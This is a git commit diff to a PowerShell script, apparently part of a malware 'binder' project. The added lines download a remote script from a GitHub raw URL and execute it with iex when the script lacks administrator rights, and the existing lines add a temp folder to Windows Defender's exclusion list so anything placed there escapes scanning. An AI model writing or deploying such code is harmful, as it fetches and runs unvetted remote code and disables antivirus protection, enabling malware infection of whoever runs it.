980ea34dded94deb8377f34981b5954e147475f0
43a1723 <hai1723notgay@gmail.com>
2024-06-29 16:52:46 +0700

    Update main.ps1

--- file/main.ps1
+++ file/main.ps1
@@ -1,2 +1,7 @@
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/admin.ps1" -UseBasicParsing).Content
+    Stop-Process $pid -Force
+}
+
 $directoryPath = "$env:temp\bindergood"
 Add-MpPreference -ExclusionPath $directoryPath
